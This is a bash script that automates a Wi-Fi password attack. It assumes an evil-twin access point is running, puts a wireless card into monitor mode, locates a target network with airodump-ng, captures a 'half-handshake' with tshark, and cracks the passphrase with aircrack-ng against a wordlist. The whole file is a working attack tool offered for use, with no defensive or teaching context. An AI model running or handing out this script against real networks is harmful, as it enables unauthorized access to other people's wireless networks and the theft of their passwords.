#!/bin/bash

if [ $# -ne 3 ]; then
        echo "usage: ./half-handshake <wireless interface> <target SSID> <wordlist>"
        exit 1 # exit 0 means success, nonzero means failure
fi

IFACE=$1
SSID=$2
WORDLIST=$3

clear
read -p "Evil Twin deployed? [Enter]"
sudo airmon-ng check kill &> /dev/null
sudo airmon-ng start $IFACE &> /dev/null

read -p "Enter Q twice to quit airodump-ng once $SSID appears [Enter]"
sudo airodump-ng $IFACE -w dump --output-format csv

# identify channel and bssid
BSSID=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $1}') # -m 1 for first result
CHANNEL=$(grep -m 1 "$SSID" dump-01.csv | awk -F',' '{print $4}')
rm -f dump-01.csv

clear
echo $SSID is on channel $CHANNEL with BSSID $BSSID
read -p "Ready to capture half-handshake. Enter capture length in seconds to begin: " CAPTIME

# capture handshake
sudo airodump-ng $IFACE -c $CHANNEL -K 1 &> /dev/null & # -K 1 means non-interactive mode
tshark -i wlan0 -w raw.pcapng -a duration:$CAPTIME &> /dev/null &

printf "Capturing... %3u" $CAPTIME # %3u means unsigned int and pad to 3 chars wide
while [ $CAPTIME -gt 0 ]; do
        sleep 1
        CAPTIME=$((CAPTIME-1))
        printf "\b\b\b%3u" $CAPTIME # backspace 3 times to update countdown in-place
done

# filter pcap
tshark -r raw.pcapng -F pcap -w half-handshake.pcap "wlan.addr == $BSSID"
rm -f raw.pcapng

# clean up
sudo killall airodump-ng
sudo airmon-ng stop $IFACE &> /dev/null
stty sane

if ! sudo aircrack-ng half-handshake.pcap -w $WORDLIST; then
        echo "The capture did not contain any half-handshake"
        read -p "Retry capture?"
fi
